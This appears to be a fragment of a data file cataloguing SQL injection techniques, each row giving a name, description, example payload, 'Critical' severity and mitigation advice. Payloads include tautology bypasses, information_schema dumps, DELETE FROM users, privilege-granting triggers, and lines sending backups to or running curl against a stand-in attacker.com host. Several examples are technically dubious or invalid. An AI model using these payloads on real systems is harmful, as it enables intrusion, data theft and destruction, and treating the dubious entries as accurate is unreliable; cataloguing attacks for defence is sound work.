('SQL Injection via Inline Comments', 'Uses inline comments to bypass filters.', 'SELECT * FROM users WHERE id = 1 /* comment */ OR 1=1 --', 'SQL Injection', 'Critical', 'Normalize query inputs, use prepared statements, and validate syntax.'),
('SQL Injection via JSON Functions', 'Exploits JSON functions for injection.', 'SELECT * FROM users WHERE JSON_EXTRACT(data, ''$.key'') = ''1'' OR 1=1 --', 'SQL Injection', 'Critical', 'Sanitize JSON inputs, use prepared statements, and validate queries.'),
('SQL Injection via Full-Text Search', 'Exploits full-text search for injection.', 'SELECT * FROM users WHERE MATCH(username) AGAINST(''admin'' IN BOOLEAN MODE) OR 1=1 --', 'SQL Injection', 'Critical', 'Disable full-text search if unused, use prepared statements, and validate inputs.'),
('SQL Injection via Temporary Tables', 'Creates temporary tables for data exfiltration.', 'CREATE TEMPORARY TABLE temp SELECT * FROM users; SELECT * FROM temp WHERE 1=1 --', 'SQL Injection', 'Critical', 'Restrict temporary table creation, use prepared statements, and audit queries.'),
('SQL Injection via Database Backup', 'Triggers backups to exfiltrate data.', 'SELECT * FROM users WHERE id = 1; BACKUP DATABASE db TO DISK=''http://attacker.com/db.bak'' --', 'SQL Injection', 'Critical', 'Disable backup commands, use prepared statements, and restrict permissions.'),
('SQL Injection via Event Scheduler', 'Uses event scheduler for persistent attacks.', 'CREATE EVENT evil_event ON SCHEDULE EVERY 1 SECOND DO CALL system(''curl http://attacker.com''); --', 'SQL Injection', 'Critical', 'Disable event scheduler, use prepared statements, and audit events.'),
('SQL Injection via View Abuse', 'Abuses database views for data extraction.', 'CREATE VIEW evil_view AS SELECT * FROM users; SELECT * FROM evil_view WHERE 1=1 --', 'SQL Injection', 'Critical', 'Restrict view creation, use prepared statements, and validate queries.'),
('SQL Injection via Transaction Abuse', 'Manipulates transactions for malicious actions.', 'START TRANSACTION; DELETE FROM users; ROLLBACK; --', 'SQL Injection', 'Critical', 'Restrict transaction permissions, use prepared statements, and audit queries.'),
('SQL Injection via Collation Abuse', 'Exploits collation differences for injection.', 'SELECT * FROM users WHERE username COLLATE utf8_general_ci = ''admin'' OR 1=1 --', 'SQL Injection', 'Critical', 'Normalize collation, use prepared statements, and validate inputs.'),
('SQL Injection via Binary Comparison', 'Uses binary comparison to bypass filters.', 'SELECT * FROM users WHERE BINARY username = ''admin'' OR 1=1 --', 'SQL Injection', 'Critical', 'Use prepared statements, validate inputs, and enforce strict comparisons.'),
('SQL Injection via Database Connection', 'Exploits database connection strings.', 'DRIVER={SQL Server};SERVER=attacker.com;DATABASE=db --', 'SQL Injection', 'Critical', 'Sanitize connection strings, use prepared statements, and restrict connections.'),
('SQL Injection via Cursor Abuse', 'Abuses database cursors for injection.', 'DECLARE evil_cursor CURSOR FOR SELECT * FROM users WHERE 1=1; FETCH evil_cursor INTO @data; --', 'SQL Injection', 'Critical', 'Restrict cursor usage, use prepared statements, and validate queries.'),
('SQL Injection via XML Functions', 'Exploits XML functions for injection.', 'SELECT * FROM users WHERE EXTRACTVALUE(''<a>1</a>'', ''/a'') = 1 OR 1=1 --', 'SQL Injection', 'Critical', 'Disable XML functions, use prepared statements, and validate inputs.'),
('SQL Injection via Dynamic SQL', 'Executes dynamic SQL for injection.', 'EXEC(''SELECT * FROM users WHERE id = '' + @input) --', 'SQL Injection', 'Critical', 'Avoid dynamic SQL, use prepared statements, and sanitize inputs.'),
('SQL Injection via Full Query Replacement', 'Replaces entire query via injection.', '1; SELECT * FROM users --', 'SQL Injection', 'Critical', 'Use prepared statements, validate query structure, and restrict permissions.'),
('SQL Injection via Parameter Tampering', 'Tampers with query parameters for injection.', 'id=1 OR 1=1 --', 'SQL Injection', 'Critical', 'Validate query parameters, use prepared statements, and enforce input validation.'),
('SQL Injection via Multi-Statement Execution', 'Executes multiple SQL statements.', 'SELECT * FROM users WHERE id = 1; INSERT INTO users (username) VALUES (''attacker'') --', 'SQL Injection', 'Critical', 'Disable multi-statement queries, use prepared statements, and restrict permissions.'),
('SQL Injection via Recursive Queries', 'Uses recursive CTEs for injection.', 'WITH RECURSIVE evil AS (SELECT 1 UNION SELECT 1 WHERE (SELECT 1 FROM users WHERE 1=1)) SELECT * FROM evil --', 'SQL Injection', 'Critical', 'Restrict recursive queries, use prepared statements, and validate inputs.'),
('SQL Injection via Trigger Escalation', 'Escalates privileges via triggers.', 'CREATE TRIGGER evil_trigger AFTER INSERT ON users FOR EACH ROW BEGIN GRANT ALL PRIVILEGES TO ''attacker''; END --', 'SQL Injection', 'Critical', 'Restrict trigger creation, use prepared statements, and audit triggers.'),
('SQL Injection via Stored Function', 'Abuses stored functions for injection.', 'CREATE FUNCTION evil_func() RETURNS TEXT DETERMINISTIC RETURN (SELECT GROUP_CONCAT(username) FROM users); --', 'SQL Injection', 'Critical', 'Restrict function creation, use prepared statements, and validate inputs.'),
('SQL Injection via Database Link', 'Exploits database links for injection.', 'SELECT * FROM users@evil_link WHERE id = 1 OR 1=1 --', 'SQL Injection', 'Critical', 'Disable database links, use prepared statements, and restrict connections.'),
('SQL Injection via Full Database Dump', 'Dumps entire database via injection.', 'SELECT * FROM users WHERE id = 1 UNION SELECT table_name, column_name, NULL FROM information_schema.columns --', 'SQL Injection', 'Critical', 'Restrict schema access, use prepared statements, and monitor queries.'),
('SQL Injection via Character Encoding', 'Uses character encoding to bypass filters.', 'SELECT * FROM users WHERE username = N''admin'' OR 1=1 --', 'SQL Injection', 'Critical', 'Normalize character encoding, use prepared statements, and validate inputs.'),
('SQL Injection via NULL Handling', 'Exploits NULL handling for injection.', 'SELECT * FROM users WHERE username IS NULL OR 1=1 --', 'SQL Injection', 'Critical', 'Validate NULL inputs, use prepared statements, and enforce strict validation.'),
('SQL Injection via Aggregate Functions', 'Abuses aggregate functions for injection.', 'SELECT COUNT(*) FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE username=''admin'') --', 'SQL Injection', 'Critical', 'Restrict aggregate function usage, use prepared statements, and validate queries.'),
('SQL Injection via Window Functions', 'Exploits window functions for injection.', 'SELECT ROW_NUMBER() OVER (PARTITION BY (SELECT 1 FROM users WHERE 1=1)) FROM users --', 'SQL Injection', 'Critical', 'Restrict window function usage, use prepared statements, and validate inputs.'),
('SQL Injection via Prepared Statement Misuse', 'Misuses prepared statements for injection.', 'PREPARE stmt FROM ''SELECT * FROM users WHERE id = ? OR 1=1''; EXECUTE stmt USING @id; --', 'SQL Injection', 'Critical', 'Validate prepared statement queries, avoid dynamic SQL, and sanitize inputs.'),
('SQL Injection via Cross-Database Queries', 'Accesses other databases via injection.', 'SELECT * FROM other_db.users WHERE id = 1 OR 1=1 --', 'SQL Injection', 'Critical', 'Restrict cross-database access, use prepared statements, and validate queries.'),
('SQL Injection via Role Abuse', 'Abuses database roles for privilege escalation.', 'SET ROLE admin; SELECT * FROM users --', 'SQL Injection', 'Critical', 'Restrict role changes, use prepared statements, and audit permissions.'),
('SQL Injection via Full-Text Index', 'Exploits full-text indexes for injection.', 'SELECT * FROM users WHERE MATCH(data) AGAINST(''admin'' OR 1=1 --'')', 'SQL Injection', 'Critical', 'Disable full-text indexes if unused, use prepared statements, and validate inputs.'),
('SQL Injection via Spatial Functions', 'Exploits spatial functions for injection.', 'SELECT * FROM users WHERE ST_Contains(geom, ST_GeomFromText(''POINT(1 1)'')) OR 1=1 --', 'SQL Injection', 'Critical', 'Disable spatial functions, use prepared statements, and validate inputs.'),
('SQL Injection via Transaction Isolation', 'Manipulates transaction isolation for injection.', 'SET TRANSACTION ISOLATION LEVEL SERIALIZABLE; SELECT * FROM users WHERE id = 1 OR 1=1 --', 'SQL Injection', 'Critical', 'Restrict transaction isolation changes, use prepared statements, and validate queries.'),
('SQL Injection via Metadata Injection', 'Injects into metadata queries.', 'SELECT * FROM information_schema.processlist WHERE user=''admin'' OR 1=1 --', 'SQL Injection', 'Critical', 'Restrict metadata access, use prepared statements, and monitor queries.'),
('SQL Injection via Audit Log Abuse', 'Manipulates audit logs via injection.', 'SELECT * FROM audit_log WHERE event=''login'' AND 1=1 --', 'SQL Injection', 'Critical', 'Restrict audit log access, use prepared statements, and validate queries.'),
('SQL Injection via Backup Restoration', 'Restores malicious backups via injection.', 'RESTORE DATABASE db FROM DISK=''http://attacker.com/malicious.bak'' --', 'SQL Injection', 'Critical', 'Disable backup restoration, use prepared statements, and restrict permissions.');
